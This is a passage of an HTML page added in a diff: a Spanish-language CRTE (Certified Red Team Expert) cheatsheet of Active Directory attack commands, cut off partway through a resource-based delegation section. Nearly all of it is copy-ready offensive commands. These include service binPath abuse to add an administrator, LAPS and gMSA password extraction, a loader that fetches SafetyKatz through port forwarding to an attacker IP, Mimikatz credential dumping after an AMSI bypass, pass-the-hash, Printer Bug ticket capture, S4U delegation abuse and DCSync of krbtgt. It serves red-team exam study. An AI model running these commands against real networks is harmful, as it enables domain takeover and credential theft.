@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#050510">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>CRTE Cheatsheet - Active Directory | Guarina0x0</title>
+    <meta name="description" content="CRTE (Certified Red Team Expert) - Cheatsheet completa de comandos de Active Directory: Enumeration, Kerberos, Delegation, DCSync, Trust Abuse y m&aacute;s.">
+    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="manifest" href="manifest.json">
+    <link rel="canonical" href="https://guarina0x0.github.io/crte-cheatsheet.html">
+    <meta property="og:url" content="https://guarina0x0.github.io/crte-cheatsheet.html">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="CRTE Cheatsheet - Active Directory | Guarina0x0">
+    <meta property="og:description" content="CRTE (Certified Red Team Expert) - Cheatsheet completa de comandos de Active Directory: Enumeration, Kerberos, Delegation, DCSync, Trust Abuse y mas.">
+    <meta property="og:site_name" content="Guarina0x0">
+    <meta name="twitter:title" content="CRTE Cheatsheet - Active Directory | Guarina0x0">
+    <meta name="twitter:description" content="CRTE (Certified Red Team Expert) - Cheatsheet completa de comandos de Active Directory: Enumeration, Kerberos, Delegation, DCSync, Trust Abuse y mas.">
+    <meta property="og:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://guarina0x0.github.io/og-image.png">
+    <meta name="twitter:site" content="@Guarina0x0">
+    <meta name="twitter:creator" content="@Guarina0x0">
+    <meta property="og:locale" content="es_ES">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="CRTE Cheatsheet - Active Directory Attack Path">
+    <meta name="author" content="Guarina0x0">
+    <meta name="keywords" content="CRTE, Certified Red Team Expert, Active Directory, Kerberos, DCSync, delegation, trust abuse, AD CS, cheatsheet, pentesting">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&family=Exo+2:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "CRTE Cheatsheet - Active Directory",
+        "description": "CRTE (Certified Red Team Expert) - Cheatsheet completa de comandos de Active Directory: Enumeration, Kerberos, Delegation, DCSync, Trust Abuse y mas.",
+        "author": {"@type": "Person", "name": "Guarina0x0", "url": "https://guarina0x0.github.io"},
+        "publisher": {"@type": "Person", "name": "Guarina0x0"},
+        "url": "https://guarina0x0.github.io/crte-cheatsheet.html",
+        "datePublished": "2026-02-14",
+        "dateModified": "2026-02-14",
+        "inLanguage": "es",
+        "isPartOf": {
+            "@type": "CollectionPage",
+            "name": "Cheatsheets Arsenal",
+            "url": "https://guarina0x0.github.io/cheatsheets.html"
+        }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            {"@type": "ListItem", "position": 1, "name": "Portal", "item": "https://guarina0x0.github.io/"},
+            {"@type": "ListItem", "position": 2, "name": "Cheatsheets", "item": "https://guarina0x0.github.io/cheatsheets.html"},
+            {"@type": "ListItem", "position": 3, "name": "CRTE - Active Directory"}
+        ]
+    }
+    </script>
+    <link rel="stylesheet" href="styles.css">
+    <script>(function(){var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t);})()</script>
+</head>
+<body>
+<a href="#main-content" class="skip-link">Saltar al contenido</a>
+<div class="reading-progress" id="readingProgress"></div>
+
+<div class="grid-overlay"></div>
+
+<!-- Nav -->
+<nav class="nav" id="nav">
+    <a href="/" class="nav-brand">
+        <div class="nav-logo"><span>G</span></div>
+        <span class="nav-title">GUARINA0x0</span>
+    </a>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="/">Portal</a></li>
+        <li><a href="/#categorias">Categor&iacute;as</a></li>
+        <li><a href="cheatsheets.html">Cheatsheets</a></li>
+        <li><a href="https://github.com/Guarina0x0" target="_blank" rel="noopener noreferrer">GitHub</a></li>
+    </ul>
+    <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+        <svg class="icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+    </button>
+    <button class="search-trigger" id="searchTrigger" aria-label="Search">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        <kbd>Ctrl+K</kbd>
+    </button>
+    <div class="nav-hamburger" id="hamburger" role="button" aria-label="Toggle navigation menu" tabindex="0">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</nav>
+
+<!-- Breadcrumbs -->
+<nav class="breadcrumbs" aria-label="Breadcrumb">
+    <a href="/">Portal</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="cheatsheets.html">Cheatsheets</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">CRTE</span>
+</nav>
+
+<!-- Hero -->
+<section class="page-hero">
+    <div class="page-hero-tag">// Dimensi&oacute;n C-500 :: Certified Red Team Expert</div>
+    <h1><span class="accent">CRTE</span> Cheatsheet</h1>
+    <p class="page-hero-desc">Comandos y t&eacute;cnicas de Active Directory recopilados durante la preparaci&oacute;n y examen del CRTE. Desde enumeraci&oacute;n b&aacute;sica hasta abuso de Forest Trusts y PAM.</p>
+    <div class="page-hero-badges">
+        <span class="badge">Active Directory</span>
+        <span class="badge">Kerberos</span>
+        <span class="badge">Delegation</span>
+        <span class="badge">Trust Abuse</span>
+        <span class="badge">DCSync</span>
+        <span class="badge">AD CS</span>
+        <span class="badge">MSSQL</span>
+    </div>
+    <div>
+        <a class="credential-verify" href="https://www.credential.net/71c40f42-aabb-49c4-80f1-3f17b0155248#acc.h5SLtkHQ" target="_blank" rel="noopener noreferrer">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+            CRTE Credential
+        </a>
+        <a class="credential-verify" href="https://www.credential.net/6aa5eeab-b942-4241-a119-3f1ae971dab0#acc.RnH7icPt" target="_blank" rel="noopener noreferrer" style="margin-left: 0.5rem;">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+            CRTP Credential
+        </a>
+    </div>
+</section>
+
+<div class="page-layout">
+
+<!-- Sidebar -->
+<aside class="sidebar" role="complementary" aria-label="Navigation sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <ul class="sidebar-nav">
+        <li><a href="#enumeration"><span class="num">01</span> Enumeration</a></li>
+        <li><a href="#privesc"><span class="num">02</span> Local Privilege Escalation</a></li>
+        <li><a href="#laps"><span class="num">03</span> LAPS</a></li>
+        <li><a href="#credentials"><span class="num">04</span> Credential Extraction</a></li>
+        <li><a href="#gmsa"><span class="num">05</span> gMSA</a></li>
+        <li><a href="#pth"><span class="num">06</span> Pass The Hash</a></li>
+        <li><a href="#applocker"><span class="num">07</span> AppLocker &amp; CLM</a></li>
+        <li><a href="#unconstrained"><span class="num">08</span> Unconstrained Delegation</a></li>
+        <li><a href="#constrained"><span class="num">09</span> Constrained Delegation</a></li>
+        <li><a href="#acl"><span class="num">10</span> ACL Abuse &amp; RBCD</a></li>
+        <li><a href="#tickets"><span class="num">11</span> Golden &amp; Silver Tickets</a></li>
+        <li><a href="#dcsync"><span class="num">12</span> DCSync</a></li>
+        <li><a href="#adcs"><span class="num">13</span> AD CS (Certificates)</a></li>
+        <li><a href="#azuread"><span class="num">14</span> Azure AD Connect</a></li>
+        <li><a href="#domainprivesc"><span class="num">15</span> Domain Privesc (Trust &amp; KRBTGT)</a></li>
+        <li><a href="#foresttrust"><span class="num">16</span> Forest Trust Abuse</a></li>
+        <li><a href="#mssql"><span class="num">17</span> MSSQL Abuse</a></li>
+        <li><a href="#fsp"><span class="num">18</span> Foreign Security Principals</a></li>
+        <li><a href="#pam"><span class="num">19</span> PAM Trust</a></li>
+        <li><a href="#recurring"><span class="num">20</span> Recurring Commands</a></li>
+    </ul>
+</aside>
+
+<!-- Main Content -->
+<main class="content" id="main-content" role="main">
+
+<!-- 01 ENUMERATION -->
+<div class="section-block reveal" id="enumeration">
+    <div class="section-number">// 01</div>
+    <h2>AD <span class="accent">Enumeration</span></h2>
+
+    <h3>AD Module</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Import-Module Microsoft.ActiveDirectory.Management.dll
+Import-Module ActiveDirectory.psd1</pre></div>
+    </div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell - AD Module Queries</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADUser -Filter * | Select -ExpandProperty samaccountname
+Get-ADComputer -Filter * | select -expand name
+Get-ADGroup -Identity 'Domain Admins' -Properties *
+Get-ADGroup -Identity &lt;GROUP&gt; -Properties Description
+Get-ADGroupMember -Identity 'Domain Admins'
+Get-ADGroupMember -Identity 'Enterprise Admins'
+Get-ADGroupMember -Identity 'Enterprise Admins' -Server &lt;PARENT_DOMAIN&gt;
+Get-ADOrganizationalUnit -Identity 'OU=&lt;OU_NAME&gt;,DC=&lt;DOMAIN&gt;,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name
+Get-ACL 'AD:\CN=Domain Admins,CN=Users,DC=&lt;DOMAIN&gt;,DC=local' | select -ExpandProperty Access
+(Get-ADForest).Domains
+Get-ADTrust -Filter *
+Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
+(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
+Get-ADTrust -Filter * -Server &lt;TARGET_DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>PowerView</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell - PowerView</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>. .\PowerView.ps1
+
+(Get-DomainPolicy).KerberosPolicy
+Get-DomainGPOLocalGroup
+Get-DomainGroupMember -Identity &lt;GROUP&gt;
+Get-DomainOU
+(Get-DomainOU -Identity &lt;OU&gt;).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
+Get-DomainGPO
+(Get-DomainOU -Identity &lt;OU&gt;).gplink
+Get-DomainGPO -Identity '{&lt;GPO_ID&gt;}'
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "&lt;USER&gt;"}
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "&lt;GROUP&gt;"}
+Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
+Get-ForestTrust -Forest &lt;FOREST&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 02 LOCAL PRIVESC -->
+<div class="section-block reveal" id="privesc">
+    <div class="section-number">// 02</div>
+    <h2>Local <span class="accent">Privilege Escalation</span></h2>
+
+    <h3>PowerUp</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>. .\PowerUp.ps1
+Invoke-AllChecks
+Invoke-ServiceAbuse -Name &lt;SERVICE&gt; -UserName &lt;DOMAIN&gt;\&lt;USER&gt; -Verbose</pre></div>
+    </div>
+
+    <h3>Manual Service Abuse (accesschk64)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>.\accesschk64.exe -uwcqv '&lt;USER&gt;' *
+
+sc.exe config &lt;SERVICE&gt; binPath= "net localgroup administrators &lt;DOMAIN&gt;\&lt;USER&gt; /add"
+sc.exe stop &lt;SERVICE&gt;
+sc.exe start &lt;SERVICE&gt;
+sc.exe config &lt;SERVICE&gt; binPath= "&lt;ORIGINAL_BINPATH&gt;"
+sc.exe stop &lt;SERVICE&gt;
+sc.exe start &lt;SERVICE&gt;</pre></div>
+    </div>
+
+    <h3>Find Local Admin Access</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Find-LocalAdminAccess -Verbose
+Find-WMILocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess.ps1</pre></div>
+    </div>
+
+    <h3>Recursive Group Membership</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
+  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
+  $groups
+  if ($groups.count -gt 0) {
+    foreach ($group in $groups) {
+      Get-ADPrincipalGroupMembershipRecursive $group
+    }
+  }
+}</pre></div>
+    </div>
+
+    <h3>ACL Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '&lt;GROUP&gt;'}
+
+Get-DomainObjectAcl -Identity &lt;GROUP&gt; -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match '&lt;TARGET_GROUP&gt;'}</pre></div>
+    </div>
+</div>
+
+<!-- 03 LAPS -->
+<div class="section-block reveal" id="laps">
+    <div class="section-number">// 03</div>
+    <h2><span class="accent">LAPS</span> - Local Admin Password Solution</h2>
+
+    <h3>Enumeration</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Import-Module AdmPwd.PS.psd1 -Verbose
+Get-LapsPermissions.ps1</pre></div>
+    </div>
+
+    <h3>Find LAPS Read Permissions (PowerView)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}</pre></div>
+    </div>
+
+    <h3>Read Cleartext Password</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># AD Module</span>
+Get-ADComputer -Identity &lt;COMPUTER&gt; -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+
+<span class="comment"># AdmPwd Module</span>
+Get-AdmPwdPassword -ComputerName &lt;COMPUTER&gt;
+
+<span class="comment"># PowerView</span>
+Get-DomainObject -Identity &lt;COMPUTER&gt; | select -ExpandProperty ms-mcs-admpwd</pre></div>
+    </div>
+
+    <h3>Access Machine with LAPS Password</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>winrs -r:&lt;COMPUTER&gt; -u:.\administrator -p:&lt;LAPS_PASSWORD&gt; cmd
+
+$passwd = ConvertTo-SecureString '&lt;LAPS_PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("&lt;COMPUTER&gt;\administrator", $passwd)
+$session = New-PSSession -ComputerName &lt;COMPUTER&gt; -Credential $creds</pre></div>
+    </div>
+</div>
+
+<!-- 04 CREDENTIAL EXTRACTION -->
+<div class="section-block reveal" id="credentials">
+    <div class="section-number">// 04</div>
+    <h2>Credential <span class="accent">Extraction</span></h2>
+
+    <h3>Copy Loader &amp; Dump Credentials</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Copy loader to target</span>
+echo F | xcopy Loader.exe \\&lt;TARGET&gt;\C$\Users\Public\Loader.exe
+
+<span class="comment"># Setup port forwarding to avoid detection</span>
+winrs -r:&lt;TARGET&gt; -u:.\administrator -p:&lt;PASSWORD&gt; cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;ATTACKER_IP&gt;
+
+<span class="comment"># Dump credentials</span>
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+sekurlsa::keys</pre></div>
+    </div>
+
+    <h3>BitsAdmin (Signed Binary) for Download</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe</pre></div>
+    </div>
+
+    <h3>PowerShell Remoting &amp; Invoke-Mimi</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>$passwd = ConvertTo-SecureString '&lt;PASSWORD&gt;' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("&lt;TARGET&gt;\administrator", $passwd)
+$session = New-PSSession -ComputerName &lt;TARGET&gt; -Credential $creds
+
+<span class="comment"># Bypass AMSI first, then:</span>
+Invoke-Command -FilePath Invoke-Mimi.ps1 -Session $session
+Enter-PSSession $session
+Invoke-Mimi -Command '"sekurlsa::keys"'</pre></div>
+    </div>
+</div>
+
+<!-- 05 gMSA -->
+<div class="section-block reveal" id="gmsa">
+    <div class="section-number">// 05</div>
+    <h2><span class="accent">gMSA</span> - Group Managed Service Accounts</h2>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell - Enumerate gMSA</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADServiceAccount -Filter *
+Get-ADServiceAccount -Identity &lt;GMSA_ACCOUNT&gt; -Properties * | select PrincipalsAllowedToRetrieveManagedPassword</pre></div>
+    </div>
+
+    <div class="note">You need a shell as the user who has permission to read the gMSA password.</div>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell - Extract &amp; Decode Password</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Import AD Module, then:</span>
+$Passwordblob = (Get-ADServiceAccount -Identity &lt;GMSA_ACCOUNT&gt; -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
+
+<span class="comment"># Decode with DSInternals</span>
+Import-Module DSInternals.psd1
+$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
+ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
+
+<span class="comment"># Then PTH with the extracted hash to check access</span></pre></div>
+    </div>
+</div>
+
+<!-- 06 PTH -->
+<div class="section-block reveal" id="pth">
+    <div class="section-number">// 06</div>
+    <h2>Pass <span class="accent">The Hash</span></h2>
+
+    <h3>OverPass-The-Hash (Elevated Shell)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Using AES256</span>
+SafetyKatz.exe "sekurlsa::opassth /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /aes256:&lt;AES256_HASH&gt; /run:cmd.exe" "exit"
+
+<span class="comment"># Using NTLM</span>
+SafetyKatz.exe "sekurlsa::opassth /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /ntlm:&lt;NTLM_HASH&gt; /run:cmd.exe" "exit"
+
+<span class="comment"># S4U with Rubeus</span>
+Rubeus.exe s4u /user:&lt;USER&gt; /aes256:&lt;AES256_HASH&gt; /impersonateuser:administrator /msdsspn:CIFS/&lt;TARGET.DOMAIN&gt; /altservice:HTTP /domain:&lt;DOMAIN&gt; /ptt</pre></div>
+    </div>
+
+    <h3>From Non-Elevated Shell</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Rubeus.exe asktgt /domain:&lt;DOMAIN&gt; /user:&lt;USER&gt; /aes256:&lt;AES256_HASH&gt; /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</pre></div>
+    </div>
+</div>
+
+<!-- 07 APPLOCKER -->
+<div class="section-block reveal" id="applocker">
+    <div class="section-number">// 07</div>
+    <h2>AppLocker, CLM &amp; <span class="accent">WDAC</span></h2>
+
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Check if PowerShell is in Constrained Language Mode</span>
+$ExecutionContext.SessionState.LanguageMode
+
+<span class="comment"># Check AppLocker (error = not in use)</span>
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+Get-AppLockerPolicy -Effective
+
+<span class="comment"># Check WDAC</span>
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+<span class="comment"># CodeIntegrityPolicyEnforcementStatus : 2 = Enforced</span>
+<span class="comment"># UsermodeCodeIntegrityPolicyEnforcementStatus : 2 = Enforced</span></pre></div>
+    </div>
+</div>
+
+<!-- 08 UNCONSTRAINED DELEGATION -->
+<div class="section-block reveal" id="unconstrained">
+    <div class="section-number">// 08</div>
+    <h2><span class="accent">Unconstrained</span> Delegation</h2>
+
+    <h3>Find Unconstrained Delegation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADComputer -Filter {TrustedForDelegation -eq $True}</pre></div>
+    </div>
+
+    <h3>Printer Bug Abuse</h3>
+    <div class="note">Access the machine with Unconstrained Delegation first, then monitor for incoming TGTs.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Copy Rubeus to the UD machine</span>
+echo F | xcopy Rubeus.exe \\&lt;UD_MACHINE&gt;\C$\Users\Public\Rubeus.exe /Y
+
+<span class="comment"># Monitor for incoming TGTs</span>
+winrs -r:&lt;UD_MACHINE&gt; cmd.exe
+C:\Users\Public\Rubeus.exe monitor /targetuser:&lt;DC&gt;$ /interval:5 /nowrap
+
+<span class="comment"># Trigger the Printer Bug from another shell</span>
+MS-RPRN.exe \\&lt;DC.DOMAIN&gt; \\&lt;UD_MACHINE.DOMAIN&gt;
+
+<span class="comment"># Inject the captured TGT</span>
+Rubeus.exe ptt /ticket:&lt;BASE64_TGT&gt;
+
+<span class="comment"># DCSync with the DC ticket</span>
+SharpKatz.exe --Command dcsync --User &lt;DOMAIN&gt;\krbtgt --Domain &lt;DOMAIN&gt; --DomainController &lt;DC.DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>Alternative: PowerShell Remoting</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>$session = New-PSSession &lt;UD_MACHINE&gt;
+Copy-Item -ToSession $session -Path Rubeus.exe -Destination C:\Users\Public
+Enter-PSSession $session
+cd C:\Users\Public
+.\Rubeus.exe monitor /targetuser:&lt;DC&gt;$ /interval:5 /nowrap</pre></div>
+    </div>
+
+    <h3>Cross-Forest (If TGT Delegation Enabled)</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Same technique but target the foreign forest DC</span>
+<span class="comment"># 1. Get TGT and access UD machine</span>
+<span class="comment"># 2. Send Rubeus to UD machine</span>
+<span class="comment"># 3. Monitor for foreign DC TGT</span>
+<span class="comment"># 4. Trigger MS-RPRN against foreign DC</span>
+<span class="comment"># 5. PTT and DCSync foreign forest</span>
+SharpKatz.exe --Command dcsync --User &lt;FOREIGN_DOMAIN&gt;\krbtgt --Domain &lt;FOREIGN_DOMAIN&gt; --DomainController &lt;FOREIGN_DC&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 09 CONSTRAINED DELEGATION -->
+<div class="section-block reveal" id="constrained">
+    <div class="section-number">// 09</div>
+    <h2><span class="accent">Constrained</span> Delegation</h2>
+
+    <h3>Find Constrained Delegation</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+<span class="comment"># Cross-forest</span>
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server &lt;TARGET_DOMAIN&gt;</pre></div>
+    </div>
+
+    <h3>S4U Abuse with Rubeus</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">CMD</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Generate RC4 hash from password</span>
+Rubeus.exe hash /password:&lt;PASSWORD&gt; /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt;
+
+<span class="comment"># S4U to get LDAP ticket (for DCSync)</span>
+Rubeus.exe s4u /user:&lt;USER&gt; /rc4:&lt;RC4_HASH&gt; /impersonateuser:Administrator /domain:&lt;DOMAIN&gt; /msdsspn:nmagent/&lt;DC.DOMAIN&gt; /altservice:ldap /dc:&lt;DC.DOMAIN&gt; /ptt
+
+<span class="comment"># DCSync with LDAP service ticket</span>
+SharpKatz.exe --Command dcsync --User &lt;DOMAIN&gt;\krbtgt --Domain &lt;DOMAIN&gt; --DomainController &lt;DC.DOMAIN&gt;
+SharpKatz.exe --Command dcsync --User &lt;DOMAIN&gt;\administrator --Domain &lt;DOMAIN&gt; --DomainController &lt;DC.DOMAIN&gt;</pre></div>
+    </div>
+</div>
+
+<!-- 10 ACL ABUSE -->
+<div class="section-block reveal" id="acl">
+    <div class="section-number">// 10</div>
+    <h2>ACL Abuse &amp; <span class="accent">RBCD</span></h2>
+
+    <h3>Enumerate ACL Permissions</h3>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '&lt;USER&gt;'}</pre></div>
+    </div>
+
+    <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+    <div class="note">If you have GenericWrite over a computer object, you can set RBCD.</div>
+    <div class="code-block">
+        <div class="code-header">
+            <span class="code-lang">PowerShell</span>
+            <button class="code-copy">Copy</button>
+        </div>
+        <div class="code-body"><pre><span class="comment"># Set RBCD</span>
+$comps = '&lt;MACHINE1&gt;$','&lt;MACHINE2&gt;$'
+Set-ADComputer -Identity &lt;TARGET&gt; -PrincipalsAllowedToDelegateToAccount $comps -Verbose
+
+<span class="comment"># Extract AES key of your machine (SID S-1-5-18 = SYSTEM)</span>
+SafetyKatz.exe -Command "sekurlsa::keys" "exit"
+
+<span class="comment"># S4U to get HTTP access</span>
+Rubeus.exe s4u /user:&lt;MACHINE&gt;$ /aes256:&lt;AES256_HASH&gt; /msdsspn:http/&lt;TARGET&gt; /impersonateuser:administrator /ptt
